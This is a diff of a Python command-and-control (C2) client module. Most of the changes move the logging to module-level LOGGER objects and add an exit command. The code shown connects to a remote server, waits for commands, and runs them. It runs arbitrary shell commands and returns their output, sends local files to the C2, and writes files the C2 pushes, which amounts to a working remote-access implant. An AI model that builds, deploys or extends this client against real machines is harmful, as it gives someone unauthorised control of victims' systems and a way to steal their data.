@@ -4,7 +4,6 @@ This module is the main module for a C2 client.
 import io
 import logging
 import os
-import traceback
 from argparse import ArgumentParser
 from multiprocessing import Process
 from shlex import split
@@ -17,21 +16,23 @@ import pyscreenshot as ImageGrab
 import utils
 from utils import C2Socket, RemoteDisconnected, Commands
 
-logger = logging.getLogger('client')
-logger.setLevel(logging.DEBUG)
-
-handler = logging.StreamHandler()
-handler.setLevel(logging.DEBUG)
-handler.setFormatter(
-    logging.Formatter('%(asctime)s %(name)s:%(levelname)s - %(filename)s:%(funcName)s:L%(lineno)d - %(message)s'))
-logger.addHandler(handler)
-
-handler = logging.StreamHandler()
-handler.setLevel(logging.DEBUG)
-handler.setFormatter(utils.formatter)
-utils.logger.addHandler(handler)
-
+LOGGER_CLIENT_FORMAT = '%(pathname)s:%(lineno)s %(asctime)s %(name)s:%(levelname)s %(message)s'
+LOGGER_UTILS_FORMAT = '%(pathname)s:%(lineno)s %(asctime)s %(name)s:%(levelname)s %(ip)s:%(port)s %(message)s'
 DEFAULT_PORT = 8888
+
+# Client logger config
+LOGGER = logging.getLogger('client')
+LOGGER.setLevel(logging.DEBUG)
+HANDLER = logging.StreamHandler()
+HANDLER.setLevel(logging.DEBUG)
+HANDLER.setFormatter(logging.Formatter(LOGGER_CLIENT_FORMAT, '%H:%M:%S'))
+LOGGER.addHandler(HANDLER)
+
+# Utils logger config
+UTILS_HANDLER = logging.StreamHandler()
+UTILS_HANDLER.setLevel(logging.DEBUG)
+UTILS_HANDLER.setFormatter(logging.Formatter(LOGGER_UTILS_FORMAT, '%H:%M:%S'))
+utils.LOGGER.addHandler(UTILS_HANDLER)
 
 
 def input_parser(target):
@@ -61,28 +62,34 @@ class ClientCommands(Commands):
 
     def command_upload(self, filename):
         """ Receive file from C2 and save it to local HD """
-        logging.debug("Local filename to save : %s", filename)
+        LOGGER.debug("Local filename to save : %s", filename)
         try:
             with open(filename, 'wb') as file:
                 self.sock.read_into_file(file)
-                logging.debug("Written : %s", filename)
+                LOGGER.debug("Written : %s", filename)
         except OSError as err:
-            logging.error("Error trying to upload %s : %s, %s", filename, type(err), err)
+            LOGGER.error("Error trying to upload %s : %s, %s", filename, type(err), err)
+
+    def command_exit(self):
+        """ Properly exit """
+        LOGGER.debug("Server ask to finish")
+        self.sock.sock.close()
+        raise RemoteDisconnected()
 
     def command_download(self, filename):
         """ Send local file to C2 """
-        logging.debug("Local filename to send : %s", filename)
+        LOGGER.debug("Local filename to send : %s", filename)
         if not os.path.exists(filename):
-            logging.debug("%s does not exists", filename)
+            LOGGER.debug("%s does not exists", filename)
         try:
             with open(filename, 'rb') as file:  # type: io.BufferedReader
                 self.sock.send_file(file)
         except OSError as err:
-            logging.error("Error trying to download %s : %s, %s", filename, type(err), err)
+            LOGGER.error("Error trying to download %s : %s, %s", filename, type(err), err)
 
     def command_sh(self, *cmd):
         """ Send local file to C2 """
-        logging.debug(self.input)
+        LOGGER.debug(self.input)
 
         def exec_shell():
             os.dup2(tmp.fileno(), stdout.fileno())
@@ -96,7 +103,7 @@ class ClientCommands(Commands):
             proc.join()
             tmp.seek(0)
             output = tmp.read()
-            logging.debug("Output : %s", output)
+            LOGGER.debug("Output : %s", output)
             self.sock.send_packet(output)
 
 
@@ -106,22 +113,18 @@ def main(srv_ip, srv_port):
     try:
         with C2Socket(srv_ip, srv_port) as server:
             while True:
-                logging.debug("Wait command from %s", server)
+                LOGGER.debug("Wait command from %s", server)
                 data = server.read_packet().decode()
 
                 cmd_name, *cmd_args = split(data)
-                logging.debug("Got command from %s : (%s) -> %s", server, cmd_name, cmd_args)
+                LOGGER.debug("Got command from %s : (%s) -> %s", server, cmd_name, cmd_args)
                 command = ClientCommands(server, cmd_name, cmd_args, data)
                 if command.is_valid():
                     command.execute()
     except RemoteDisconnected as err:
-        logging.warning("Server disconnect : %s", err)
+        LOGGER.warning("Server disconnect : %s", err)
     except ConnectionRefusedError:
-        logging.warning("Cannot connect to %s:%s", srv_ip, srv_port)
-    except BaseException as err:
-        logging.critical("Unknown error : %s", err)
-        traceback.print_exc()
-        sys_exit(2)
+        LOGGER.warning("Cannot connect to %s:%s", srv_ip, srv_port)
 
 
 if __name__ == '__main__':
@@ -137,7 +140,7 @@ if __name__ == '__main__':
             sleep(2)
 
     except KeyboardInterrupt:
-        logging.info("User cancel")
+        LOGGER.info("User cancel")
     except BaseException as base_err:
-        logging.critical("Unknown exception : %s", base_err)
+        LOGGER.critical("Unknown exception : %s", base_err)
         sys_exit(1)
